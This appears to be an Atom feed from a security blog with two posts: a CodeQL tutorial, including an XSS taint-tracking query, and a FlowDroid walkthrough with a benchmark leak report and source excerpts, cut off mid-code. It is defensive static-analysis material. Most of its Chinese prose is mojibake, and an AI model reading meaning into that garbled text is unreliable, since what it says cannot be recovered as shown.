<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Anemone&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://anemone.top/"/>
  <updated>2020-10-18T03:58:27.139Z</updated>
  <id>http://anemone.top/</id>
  
  <author>
    <name>Anemone</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>CodeQL è¯•ç”¨</title>
    <link href="http://anemone.top/whitebox-CodeQL%E5%88%9D%E6%8E%A2/"/>
    <id>http://anemone.top/whitebox-CodeQLåˆæ¢/</id>
    <published>2020-10-18T01:27:49.000Z</published>
    <updated>2020-10-18T03:58:27.139Z</updated>
    
    <content type="html"><![CDATA[<p>CodeQLæ˜¯ä¸€ç§åˆ†æå¼•æ“ï¼Œå…¶é¦–å…ˆå°†codeè½¬æ¢ä¸ºdatabaseï¼Œå†é€šè¿‡ç±»QLçš„æ–¹å¼æŒ–æ˜æ¼æ´ã€‚LGTMåŸºäºCodeQLæä¾›åœ¨çº¿æœåŠ¡ã€‚</p><h1 id="æ¼æ´ç±»å‹"><a href="#æ¼æ´ç±»å‹" class="headerlink" title="æ¼æ´ç±»å‹"></a>æ¼æ´ç±»å‹</h1><p>æ•°æ®æµåˆ†æå’Œæ¨¡å¼åŒ¹é…ç±»å‹æ¼æ´</p><h1 id="è¦†ç›–è¯­è¨€"><a href="#è¦†ç›–è¯­è¨€" class="headerlink" title="è¦†ç›–è¯­è¨€"></a>è¦†ç›–è¯­è¨€</h1><p>â€¢ C/C++<br>â€¢ C#<br>â€¢ Go<br>â€¢ Java<br>â€¢ Python<br>â€¢ JavaScriptï¼ˆIncludes JSX and Flow code, YAML, JSON, HTML, and XML filesï¼‰<br>â€¢ TypeScript[New]<br>è¯¦æƒ…è§ï¼š<a href="https://help.semmle.com/codeql/supported-languages-and-frameworks.html#" target="_blank" rel="noopener">https://help.semmle.com/codeql/supported-languages-and-frameworks.html#</a></p><a id="more"></a><h1 id="ç”¨æ³•"><a href="#ç”¨æ³•" class="headerlink" title="ç”¨æ³•"></a>ç”¨æ³•</h1><h2 id="CLI-å®‰è£…"><a href="#CLI-å®‰è£…" class="headerlink" title="CLI å®‰è£…"></a>CLI å®‰è£…</h2><p>ä¸‹è½½ä¸‰ä¸ªç»„ä»¶ï¼Œæ”¾åœ¨code-homeç›®å½•ä¸‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ tree -L 1</span><br><span class="line">.</span><br><span class="line">â”œâ”€â”€ codeql          <span class="comment"># codeqlå¼•æ“ï¼Œhttps://github.com/github/codeql-cli-binaries/releases</span></span><br><span class="line">â”œâ”€â”€ codeql-go       <span class="comment"># goè§£æï¼Œhttps://github.com/github/codeql-go/</span></span><br><span class="line">â””â”€â”€ codeql-repo <span class="comment"># è§„åˆ™ï¼Œhttps://github.com/github/codeql</span></span><br></pre></td></tr></table></figure><p>éªŒè¯ï¼ŒæŸ¥è¯¢è§„åˆ™é›†ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./codeql/codeql resolve qlpacks</span><br><span class="line">codeql-cpp (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/cpp/ql/src)</span><br><span class="line">codeql-cpp-tests (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/cpp/ql/<span class="built_in">test</span>)</span><br><span class="line">codeql-cpp-upgrades (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/cpp/upgrades)</span><br><span class="line">codeql-csharp (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/csharp/ql/src)</span><br><span class="line">codeql-csharp-tests (/Users/xuwenyuan/workspace/codeql-home/codeql-repo/csharp/ql/<span class="built_in">test</span>)</span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><h2 id="æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“"><a href="#æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“" class="headerlink" title="æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“"></a>æ„å»ºè¢«æµ‹é¡¹ç›®æ•°æ®åº“</h2><p>å¯¹äºè§£é‡Šå‹è¯­è¨€ç¼–å†™çš„é¡¹ç›®ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=&lt;language-identifier&gt; --<span class="built_in">source</span>-root &lt;folder-to-extract&gt; &lt;database&gt;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=javascript codeql-database</span><br></pre></td></tr></table></figure><p>å¯¹äºç¼–è¯‘å‹è¯­è¨€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database create --language=cpp &lt;output-folder&gt;/cpp-database --<span class="built_in">command</span>=make</span><br></pre></td></tr></table></figure><p>commandä¸æŒ‡å®šåˆ™ä¼šä½¿ç”¨è‡ªå¸¦çš„é»˜è®¤ç¼–è¯‘</p><p>ç‰¹æ®Šçš„identifierï¼š</p><ul><li>c/c++ï¼šcpp</li><li>c#ï¼šcsharp</li><li>JavaScript/TypeScriptï¼šjavascript</li></ul><p>å€¼å¾—ä¸€æçš„æ˜¯ï¼ŒLGTMçš„å®ç°ä¸­ä¼šåŒæ—¶è°ƒç”¨æ‰€æœ‰è¯­è¨€æ„å»ºã€‚</p><h2 id="å‘èµ·æ‰«æ"><a href="#å‘èµ·æ‰«æ" class="headerlink" title="å‘èµ·æ‰«æ"></a>å‘èµ·æ‰«æ</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database analyze &lt;database&gt; &lt;queries&gt; --format=&lt;format&gt; --output=&lt;output&gt; --threads=&lt;threads&gt;</span><br></pre></td></tr></table></figure><p>ä¾‹å¦‚ï¼ˆæ³¨æ„è¿™é‡Œé€‰æ‹©äº†lgtmçš„è§„åˆ™é›†ï¼‰ï¼š<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">codeql database analyze ./codeql-database/ ~/workspace/codeql-home/codeql-repo/javascript/ql/src/codeql-suites/javascript-lgtm-full.qls --format=csv --output=codeql.csv --threads=10</span><br></pre></td></tr></table></figure></p><h1 id="è§„åˆ™ç¼–å†™"><a href="#è§„åˆ™ç¼–å†™" class="headerlink" title="è§„åˆ™ç¼–å†™"></a>è§„åˆ™ç¼–å†™</h1><p>CodeQLç¼–å†™æŒ‡å—ï¼š <a href="https://github.com/github/codeql/blob/master/docs/ql-style-guide.md" target="_blank" rel="noopener">https://github.com/github/codeql/blob/master/docs/ql-style-guide.md</a>ï¼Œ<a href="https://help.semmle.com/QL/learn-ql/" target="_blank" rel="noopener">https://help.semmle.com/QL/learn-ql/</a>ï¼Œä»¥ä¸‹ä»£ç ä¸ºä¸€ä¾‹åˆ©ç”¨æ±¡ç‚¹åˆ†ææ£€æµ‹XSSçš„æ£€æµ‹è§„åˆ™ï¼š</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.dataflow.FlowSources</span><br><span class="line">import semmle.code.java.security.XSS</span><br><span class="line">import DataFlow2::PathGraph</span><br><span class="line">class XSSConfig extends TaintTracking::Configuration2 &#123;</span><br><span class="line">  XSSConfig() &#123; this = "XSSConfig" &#125;</span><br><span class="line">  override predicate isSource(DataFlow::Node source) &#123; source instanceof RemoteFlowSource &#125;</span><br><span class="line">  override predicate isSink(DataFlow::Node sink) &#123; sink instanceof XssSink &#125;</span><br><span class="line">  override predicate isSanitizer(DataFlow::Node node) &#123;</span><br><span class="line">    node.getType() instanceof NumericType or node.getType() instanceof BooleanType</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">from DataFlow2::PathNode source, DataFlow2::PathNode sink, XSSConfig conf</span><br><span class="line">where conf.hasFlowPath(source, sink)</span><br><span class="line"><span class="keyword">select</span> sink.getNode(), <span class="keyword">source</span>, sink, <span class="string">"Cross-site scripting vulnerability due to $@."</span>,</span><br><span class="line">  source.getNode(), <span class="string">"user-provided value"</span></span><br></pre></td></tr></table></figure><p>ç”¨CodeQLåšåˆ†æçš„ä»‹ç»å…¶ä»–ç ”ç©¶è€…å·²ç»å†™è¿‡å¾ˆå¤šäº†ï¼Œè¿™é‡Œä¸åšä»‹ç»</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;CodeQLæ˜¯ä¸€ç§åˆ†æå¼•æ“ï¼Œå…¶é¦–å…ˆå°†codeè½¬æ¢ä¸ºdatabaseï¼Œå†é€šè¿‡ç±»QLçš„æ–¹å¼æŒ–æ˜æ¼æ´ã€‚LGTMåŸºäºCodeQLæä¾›åœ¨çº¿æœåŠ¡ã€‚&lt;/p&gt;&lt;h1 id=&quot;æ¼æ´ç±»å‹&quot;&gt;&lt;a href=&quot;#æ¼æ´ç±»å‹&quot; class=&quot;headerlink&quot; title=&quot;æ¼æ´ç±»å‹&quot;&gt;&lt;/a&gt;æ¼æ´ç±»å‹&lt;/h1&gt;&lt;p&gt;æ•°æ®æµåˆ†æå’Œæ¨¡å¼åŒ¹é…ç±»å‹æ¼æ´&lt;/p&gt;&lt;h1 id=&quot;è¦†ç›–è¯­è¨€&quot;&gt;&lt;a href=&quot;#è¦†ç›–è¯­è¨€&quot; class=&quot;headerlink&quot; title=&quot;è¦†ç›–è¯­è¨€&quot;&gt;&lt;/a&gt;è¦†ç›–è¯­è¨€&lt;/h1&gt;&lt;p&gt;â€¢ C/C++&lt;br&gt;â€¢ C#&lt;br&gt;â€¢ Go&lt;br&gt;â€¢ Java&lt;br&gt;â€¢ Python&lt;br&gt;â€¢ JavaScriptï¼ˆIncludes JSX and Flow code, YAML, JSON, HTML, and XML filesï¼‰&lt;br&gt;â€¢ TypeScript[New]&lt;br&gt;è¯¦æƒ…è§ï¼š&lt;a href=&quot;https://help.semmle.com/codeql/supported-languages-and-frameworks.html#&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://help.semmle.com/codeql/supported-languages-and-frameworks.html#&lt;/a&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/categories/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="æºç å®‰å…¨" scheme="http://anemone.top/tags/%E6%BA%90%E7%A0%81%E5%AE%89%E5%85%A8/"/>
    
      <category term="CodeQL" scheme="http://anemone.top/tags/CodeQL/"/>
    
      <category term="LGTM" scheme="http://anemone.top/tags/LGTM/"/>
    
  </entry>
  
  <entry>
    <title>FlowDroid å·¥å…·ä»‹ç»å’Œè¯•ç”¨ï¼ˆè‰ç¨¿ï¼‰</title>
    <link href="http://anemone.top/pl-FlowDroid%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D%E5%92%8C%E8%AF%95%E7%94%A8/"/>
    <id>http://anemone.top/pl-FlowDroidå·¥å…·ä»‹ç»å’Œè¯•ç”¨/</id>
    <published>2020-10-10T13:19:13.000Z</published>
    <updated>2020-10-21T12:26:22.742Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å·¥å…·ä»‹ç»"><a href="#å·¥å…·ä»‹ç»" class="headerlink" title="å·¥å…·ä»‹ç»"></a>å·¥å…·ä»‹ç»</h1><p>FlowDroid[1,2] æ˜¯ Arzt ç­‰äººè®¾è®¡çš„ä¸€æ¬¾ä¸Šä¸‹æ–‡æ•æ„Ÿï¼ˆå¯¹è±¡æ•æ„Ÿï¼‰ï¼Œæµæ•æ„Ÿï¼ŒåŸŸæ•æ„Ÿçš„é™æ€æ±¡ç‚¹åˆ†æå·¥å…·ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä¸å…¶ä»–æ±¡ç‚¹åˆ†æå·¥å…·ï¼ˆå¦‚TAJï¼‰ä¸åŒçš„æ˜¯å…¶é’ˆå¯¹å®‰å“åº”ç”¨ï¼Œå¯¹å®‰å“åº”ç”¨çš„ç‰¹æ€§åšäº†å¾ˆå¤šæ”¹è¿›å’Œä¼˜åŒ–ã€‚</p><p>è¯¥å·¥å…·åŸºäºSoot[3]å’ŒHeros[4]ï¼Œsootä½œä¸ºç»å…¸çš„Javaè¯­è¨€åˆ†ææ¡†æ¶ï¼Œèƒ½æä¾›SSAå’Œcallgraphï¼ŒHerosæ˜¯ä¸€ä¸ªé€šç”¨çš„IFDS/IDSåˆ†ææ¡†æ¶ï¼Œé€Ÿåº¦æ²¡æœ‰WALAå¿«ï¼Œä½†æ˜¯æ¯”WALAæ›´é€šç”¨ã€‚</p><a id="more"></a><p><img src="/pl-FlowDroidå·¥å…·ä»‹ç»å’Œè¯•ç”¨/aliasFlow.png" alt="aliasFlow"></p><p>FlowDroid åœ¨æ±¡ç‚¹åˆ†ææ—¶å‚è€ƒäº†[Andromeda][<a href="http://www.cs.tau.ac.il/~omertrip/fase13/paper.pdf]çš„åšæ³•ï¼Œæœ‰ä¸€å®šçš„åˆ«ååˆ†æï¼Œå…·ä½“æ¥è¯´ï¼Œå½“æ±¡ç‚¹è¢«loadè‡³ä¸€ä¸ªå †åŒºï¼ˆå¦‚å›¾ä¸­`x.f=w`ï¼‰æ—¶ï¼Œè¿›è¡Œåå‘åˆ†æï¼Œæ±¡æŸ“åˆ«åå˜é‡ï¼ˆå¦‚å›¾ä¸­çš„z.g.f" target="_blank" rel="noopener">http://www.cs.tau.ac.il/~omertrip/fase13/paper.pdf]çš„åšæ³•ï¼Œæœ‰ä¸€å®šçš„åˆ«ååˆ†æï¼Œå…·ä½“æ¥è¯´ï¼Œå½“æ±¡ç‚¹è¢«loadè‡³ä¸€ä¸ªå †åŒºï¼ˆå¦‚å›¾ä¸­`x.f=w`ï¼‰æ—¶ï¼Œè¿›è¡Œåå‘åˆ†æï¼Œæ±¡æŸ“åˆ«åå˜é‡ï¼ˆå¦‚å›¾ä¸­çš„z.g.f</a>, a.g.fï¼‰ï¼Œå†æ£€æŸ¥æ±¡ç‚¹æ˜¯å¦è¿›å…¥sinkï¼ˆå¦‚å›¾ä¸­b.fï¼‰ï¼Œå…·ä½“ç®—æ³•åæ–‡ä¼šåšåˆ†æã€‚</p><h1 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h1><h2 id="æ„å»ºå·¥å…·"><a href="#æ„å»ºå·¥å…·" class="headerlink" title="æ„å»ºå·¥å…·"></a>æ„å»ºå·¥å…·</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git checkout v2.8 <span class="comment"># å…ˆåˆ‡æ¢åˆ°ç¨³å®šç‰ˆæœ¬</span></span><br><span class="line"><span class="built_in">export</span> ANDROID_JARS=/mnt/d/java_lib/Android/android-sdk/platforms</span><br><span class="line"><span class="built_in">export</span> DROIDBENCH=/mnt/d/PA/FlowDroid/DroidBench</span><br><span class="line">mvn -DskipTests install</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong>ï¼šv2.8åˆ†æ”¯ä¾èµ–çš„sootç‰ˆæœ¬æ˜¯4.3.0-SNAPSHOTï¼Œè€Œgithubçš„sootä»“åº“æœ€é«˜ç‰ˆæœ¬è¿˜æ˜¯4.2.1ï¼Œå› æ­¤è¿™é‡Œæˆ‘æ‰‹åŠ¨æ”¹ä¸€ä¸‹ï¼Œå¸Œæœ›ä¸è¦å‡ºäº‹Orz</p><h2 id="ä½¿ç”¨-1"><a href="#ä½¿ç”¨-1" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar -a DroidBench/apk/GeneralJava/Clone1.apk -p <span class="variable">$ANDROID_JARS</span> -s soot-infoflow-android/SourcesAndSinks.txt</span><br></pre></td></tr></table></figure><p>æœ‰å¦‚ä¸‹ç»“æœ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ java -jar soot-infoflow-cmd/target/soot-infoflow-cmd-jar-with-dependencies.jar -a DroidBench/apk/GeneralJava/Loop1.apk -p <span class="variable">$ANDROID_JARS</span> -s soot-infoflow-android/SourcesAndSinks.txt</span><br><span class="line">[main] INFO soot.jimple.infoflow.cmd.MainClass - Analyzing app /mnt/d/program-analysis/FlowDroid/DroidBench/apk/GeneralJava/Loop1.apk (1 of 1)...</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - Initializing Soot...</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - Loading dex files...</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - ARSC file parsing took 0.0135045 seconds</span><br><span class="line"><span class="comment"># ...</span></span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication<span class="variable">$InPlaceInfoflow</span> - The sink virtualinvoke <span class="variable">$r7</span>.&lt;android.telephony.SmsManager: void sendTextMessage(java.lang.String,java.lang.String,java.lang.String,android.app.PendingIntent,android.app.PendingIntent)&gt;(<span class="string">"+49 1234"</span>, null, r5, null, null) <span class="keyword">in</span> method &lt;de.ecspride.LoopExample1: void onCreate(android.os.Bundle)&gt; was called with values from the following sources:</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication<span class="variable">$InPlaceInfoflow</span> - - <span class="variable">$r4</span> = virtualinvoke r3.&lt;android.telephony.TelephonyManager: java.lang.String getDeviceId()&gt;() <span class="keyword">in</span> method &lt;de.ecspride.LoopExample1: void onCreate(android.os.Bundle)&gt;</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication<span class="variable">$InPlaceInfoflow</span> - Data flow solver took 0 seconds. Maximum memory consumption: 53 MB</span><br><span class="line">[main] INFO soot.jimple.infoflow.android.SetupApplication - Found 1 leaks</span><br></pre></td></tr></table></figure><h1 id="æºç è§£æ"><a href="#æºç è§£æ" class="headerlink" title="æºç è§£æ"></a>æºç è§£æ</h1><p>é¦–å…ˆFlowDroidé¡¹ç›®æœ‰å››ä¸ªå­é¡¹ç›®ï¼š</p><ul><li>soot-infoflowï¼š æ•°æ®æµåˆ†ææ ¸å¿ƒåŒ…ï¼ˆåŸºäºSootï¼‰</li><li>soot-infoflowandroidï¼š ä¸å®‰å“ç‰¹æ€§ç›¸å…³çš„æ•°æ®æµåˆ†æ</li><li>soot-infoflow-summariesï¼šè¿˜ä¸æ¸…æ¥šï¼Œåƒæ˜¯åšå‡½æ•°æ‘˜è¦çš„ç±»</li><li>soot-infoflow-cmdï¼šå‘½ä»¤è¡Œå…¥å£</li></ul><h2 id="soot-jimple-infoflow-cmd-MainClass-main"><a href="#soot-jimple-infoflow-cmd-MainClass-main" class="headerlink" title="soot.jimple.infoflow.cmd.MainClass#main"></a>soot.jimple.infoflow.cmd.MainClass#main</h2><p>å…ˆä»å…¥å£å¼€å§‹ï¼Œç¨‹åºå…¥å£åœ¨soot-infoflow-cmdåŒ…ä¸‹é¢çš„<code>soot.jimple.infoflow.cmd.MainClass</code>ï¼Œä¸»è¦é€šè¿‡å‘½ä»¤ä¼ å…¥ä¸€äº›é…ç½®ï¼ŒåŒ…æ‹¬ä½†ä¸é™äºï¼š</p><ul><li>-apkfileï¼šapkæ–‡ä»¶</li><li>-platformsdirï¼šAndroid SDK</li><li>-platformsdirï¼š Source &amp; Sinkå®šä¹‰</li><li>-outputfileï¼šè¾“å‡ºæ–‡ä»¶</li><li>-timeoutï¼šæ•°æ®æµåˆ†æè¶…æ—¶æ—¶é—´</li><li>-callbacktimeoutï¼šcallbackæ”¶é›†è¶…æ—¶æ—¶é—´</li></ul><p>ä¸ç‰¹æ€§ã€ç®—æ³•ç›¸å…³ï¼š</p><ul><li>-nostaticï¼šä¸åˆ†æé™æ€æ•°æ®æµ</li><li>-nocallbacksï¼šä¸åˆ†æcallback</li><li>-noexceptionsï¼šä¸åˆ†æexceptionæ•°æ®æµ</li><li>-notypecheckingï¼šä¸åˆ†ææ±¡ç‚¹ç±»å‹æ£€æŸ¥</li><li>-enablereflectionï¼šå…è®¸åå°„ç‰¹æ€§</li><li>-missingsummariesoutputfileï¼šåˆ—å‡ºå‡½æ•°æ‘˜è¦ç¼ºå¤±çš„ç±»</li><li>-outputlinenumbersï¼šåˆ—å‡ºbytecode line number</li><li>-taintwrapperï¼šã€TODOã€‘è¿™ä¸ªä¸æ˜¯å¾ˆæ¸…æ¥šï¼Œå¯ä»¥è®¾ç½®Noneï¼ŒEASYï¼ŒSTUBDROIDæˆ–BULTI</li><li>-taintwrapperfileï¼šè®¾ç½®æ±¡ç‚¹æ–‡ä»¶</li><li>-aplengthï¼šè·¯å¾„æœ€å¤§é•¿åº¦</li><li>-cgalgoï¼šè°ƒç”¨å›¾ç”Ÿæˆç®—æ³•ï¼Œe.g. CHAï¼ŒVTAï¼ŒRTAï¼ŒSPARK, GEOM</li><li>-pathalgoï¼šè¿”å›ç»“æœç®—æ³•ï¼Œe.g., CONTEXTSENSITIVE, CONTEXTINSENSITIVE, SOURCESONLY</li><li>-dataflowsolverï¼šæ•°æ®æµè§£æç®—æ³•, e.g., CONTEXTFLOWSENSITIVE, FLOWINSENSITIVE</li></ul><p>è¿˜æœ‰å¾ˆå¤šé…ç½®ç­‰ç”¨åˆ°æ—¶å†åˆ†æã€‚</p><p>æ¥ç€è®¾ç½®ITaintPropagationWrapperï¼Œè¯¥æ¥å£ç”¨äºä½¿ç”¨å‡½æ•°æ‘˜è¦ä¼ æ’­æ±¡ç‚¹ï¼Œä¸»è¦ç”¨äºåŠ é€Ÿåˆ†æä»¥åŠå¯¹æŠ—æºä»£ç ä¸å­˜åœ¨ä»¥åŠnativeçš„æƒ…å†µ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Initialize the taint wrapper. We only do this once for all apps to cache</span></span><br><span class="line"><span class="comment">// summaries that we have already loaded.</span></span><br><span class="line">ITaintPropagationWrapper taintWrapper = initializeTaintWrapper(cmd);</span><br></pre></td></tr></table></figure><p>æ¥ç€æ ¹æ®é…ç½®äº§ç”Ÿä¸€ä¸ªanalyzerï¼ˆSetupApplicationï¼Œç»§æ‰¿è‡ªITaintWrapperDataFlowAnalysisï¼‰ï¼›</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Create the data flow analyzer</span></span><br><span class="line">analyzer = createFlowDroidInstance(config);</span><br><span class="line">analyzer.setTaintWrapper(taintWrapper);</span><br></pre></td></tr></table></figure><p>æœ€åè°ƒç”¨analyzer.runInfoflow()å¯åŠ¨åˆ†æä¸»æµç¨‹ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Start the data flow analysis</span></span><br><span class="line">analyzer.runInfoflow();</span><br></pre></td></tr></table></figure><h2 id="soot-jimple-infoflow-android-SetupApplication-runInfoflow"><a href="#soot-jimple-infoflow-android-SetupApplication-runInfoflow" class="headerlink" title="soot.jimple.infoflow.android.SetupApplication#runInfoflow()"></a>soot.jimple.infoflow.android.SetupApplication#runInfoflow()</h2><p>ç°åœ¨è¿›å…¥äº†soot-infoflow-androidåŒ…ï¼Œåœ¨runInfoflow()ä¸­ï¼Œå…ˆè°ƒç”¨ISourceSinkDefinitionProviderè¯»å–source-sinkæ–‡ä»¶ï¼Œæ–‡ä»¶å¯ä»¥æœ‰ä¸‰ç§æ ¼å¼ï¼šxml, txtå’Œriflï¼Œæ¥ç€è°ƒç”¨SetupApplication.runInfoflow(ISourceSinkDefinitionProvider)ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InfoflowResults <span class="title">runInfoflow</span><span class="params">()</span> <span class="keyword">throws</span> IOException, XmlPullParserException </span>&#123;</span><br><span class="line">    <span class="comment">// If we don't have a source/sink file by now, we cannot run the data</span></span><br><span class="line">    <span class="comment">// flow analysis</span></span><br><span class="line"><span class="comment">// ...</span></span><br><span class="line">    ISourceSinkDefinitionProvider parser = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (fileExtension.equals(<span class="string">".xml"</span>)) &#123;</span><br><span class="line">            parser = XMLSourceSinkParser.fromFile(sourceSinkFile,</span><br><span class="line">                    <span class="keyword">new</span> ConfigurationBasedCategoryFilter(config.getSourceSinkConfig()));</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension.equals(<span class="string">".txt"</span>))</span><br><span class="line">            parser = PermissionMethodParser.fromFile(sourceSinkFile);</span><br><span class="line">        <span class="keyword">else</span> <span class="keyword">if</span> (fileExtension.equals(<span class="string">".rifl"</span>))</span><br><span class="line">            parser = <span class="keyword">new</span> RIFLSourceSinkDefinitionProvider(sourceSinkFile);</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedSourceSinkFormatException(<span class="string">"The Inputfile isn't a .txt or .xml file."</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (SAXException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> IOException(<span class="string">"Could not read XML file"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> runInfoflow(parser);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨ SetupApplication.runInfoflow(ISourceSinkDefinitionProvider)ä¸­ï¼Œé¦–å…ˆåˆå§‹åŒ–Sootâ€”â€”<code>initializeSoot()</code>ï¼ŒåŒ…æ‹¬åˆ¶å®šæŒ‡é’ˆåˆ†ææ–¹æ³•ï¼ˆé»˜è®¤SPARKï¼‰ã€ç»™ä¸€äº›ç‰¹å®šè°ƒç”¨æ·»åŠ CallGraphè¾¹â€”â€”<code>LibraryClassPatcher.patchLibraries(</code>)ï¼›æ¥ç€è¯»å–Androidèµ„æºå’Œé…ç½®æ–‡ä»¶ï¼ŒåŒ…æ‹¬AndroidManifest.xmlæ–‡ä»¶ï¼Œè¿™äº›æ–‡ä»¶ç”¨äºè·å–åˆ†æå…¥å£ï¼›æ¥ç€å¯¹entrypointè¿›è¡Œåˆ†æâ€”â€”<code>SetupApplication.processEntryPoint</code>ï¼›æœ€åæ”¶é›†åˆ†æç»“æœå¹¶è¿”å›ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> InfoflowResults <span class="title">runInfoflow</span><span class="params">(ISourceSinkDefinitionProvider sourcesAndSinks)</span> </span>&#123;</span><br><span class="line"><span class="comment">// Start a new Soot instance</span></span><br><span class="line">G.reset();</span><br><span class="line">initializeSoot();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Perform basic app parsing</span></span><br><span class="line">parseAppResources();</span><br><span class="line"></span><br><span class="line">MultiRunResultAggregator resultAggregator = <span class="keyword">new</span> MultiRunResultAggregator();</span><br><span class="line"></span><br><span class="line"><span class="comment">// In one-component-at-a-time, we do not have a single entry point</span></span><br><span class="line"><span class="comment">// creator. For every entry point, run the data flow 